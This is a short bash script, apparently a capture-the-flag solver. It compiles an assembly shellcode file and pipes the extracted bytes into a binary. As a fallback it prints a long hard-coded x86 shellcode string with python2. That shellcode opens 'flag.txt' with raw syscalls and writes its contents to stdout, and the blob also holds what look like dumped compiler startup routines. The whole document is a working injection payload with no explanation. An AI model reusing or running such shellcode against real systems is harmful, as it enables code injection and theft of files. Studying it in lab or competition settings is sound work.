#!/bin/bash

gcc shellcode0.s -m32 -o shellcode.bin 2> /dev/null

if [ $? -eq 0 ];then
  out=$(./extract.sh shellcode.bin)
  echo "$out" | ./shellcode.bin
else
  python2 -c 'print
"\x53\x83\xec\x08\xe8\x8f\x00\x00\x00\x81\xc3\x9f\x1c\x00\x00\x8b\x83\xf4\xff\xff\xff\x85\xc0\x74\x05\xe8\x2a\x00\x00\x00\x83\xc4\x08\x5b\xc3\xff\xb3\x04\x00\x00\x00\xff\xa3\x08\x00\x00\x00\x00\x00\xff\xa3\x0c\x00\x00\x00\x68\x00\x00\x00\x00\xe9\xe0\xff\xff\xff\xff\xa3\xf4\xff\xff\xff\x66\x90\x31\xed\x5e\x89\xe1\x83\xe4\xf0\x50\x54\x52\xe8\x22\x00\x00\x00\x81\xc3\x40\x1c\x00\x00\x8d\x83\xa0\xe5\xff\xff\x50\x8d\x83\x40\xe5\xff\xff\x50\x51\x56\xff\xb3\xf8\xff\xff\xff\xe8\xaf\xff\xff\xff\xf4\x8b\x1c\x24\xc3\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x8b\x1c\x24\xc3\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\xe8\xe4\x00\x00\x00\x81\xc2\xfb\x1b\x00\x00\x8d\x8a\x18\x00\x00\x00\x8d\x82\x18\x00\x00\x00\x39\xc8\x74\x1d\x8b\x82\xec\xff\xff\xff\x85\xc0\x74\x13\x55\x89\xe5\x83\xec\x14\x51\xff\xd0\x83\xc4\x10\xc9\xc3\x90\x8d\x74\x26\x00\xf3\xc3\x8d\xb6\x00\x00\x00\x00\xe8\xa4\x00\x00\x00\x81\xc2\xbb\x1b\x00\x00\x55\x8d\x8a\x18\x00\x00\x00\x8d\x82\x18\x00\x00\x00\x29\xc8\x89\xe5\x53\xc1\xf8\x02\x89\xc3\x83\xec\x04\xc1\xeb\x1f\x01\xd8\xd1\xf8\x74\x14\x8b\x92\xfc\xff\xff\xff\x85\xd2\x74\x0a\x83\xec\x08\x50\x51\xff\xd2\x83\xc4\x10\x8b\x5d\xfc\xc9\xc3\x89\xf6\x8d\xbc\x27\x00\x00\x00\x55\x89\xe5\x53\xe8\x57\xff\xff\xff\x81\xc3\x67\x1b\x00\x00\x83\xec\x04\x80\xbb\x18\x00\x00\x00\x75\x28\x8b\x83\xf0\xff\xff\xff\x85\xc0\x74\x12\x83\xec\x0c\xff\xb3\x14\x00\x00\x00\xff\x93\xf0\xff\xff\xff\x83\xc4\x10\xe8\x34\xff\xff\xff\xc6\x83\x18\x00\x00\x00\x8b\x5d\xfc\xc9\xc3\x90\x8d\xb4\x26\x00\x00\x00\x55\x89\xe5\x5d\xe9\x57\xff\xff\xff\x8b\x14\x24\xc3\x90\x90\x90\x90\x90\x90\xb8\x05\x00\x00\x00\x6a\x00\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x54\x5b\xb9\x00\x00\x00\x00\xcd\x80\x83\xec\x40\x89\xc3\x89\xe1\xba\x40\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\x90\x90\x90\x90\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x55\x57\x56\x53\xe8\xa7\xfe\xff\xff\x81\xc3\xb7\x1a\x00\x00\x83\xec\x0c\x8b\x6c\x24\x28\x8d\xb3\xf8\xfe\xff\xff\xe8\xf7\xfd\xff\xff\x8d\x83\xf4\xfe\xff\xff\x29\xc6\xc1\xfe\x02\x85\xf6\x74\x25\x31\xff\x8d\xb6\x00\x00\x00\x00\x83\xec\x04\x55\xff\x74\x24\x2c\xff\x74\x24\x2c\xff\x94\xbb\xf4\xfe\xff\x83\xc7\x01\x83\xc4\x10\x39\xfe\x75\xe3\x83\xc4\x0c\x5b\x5e\x5f\x5d\xc3\x8d\x76\x00\xf3\xc3\x53\x83\xec\x08\xe8\x43\xfe\xff\xff\x81\xc3\x53\x1a\x00\x00\x83\xc4\x08\x5b\xc3"' | ./shellcode.bin
fi
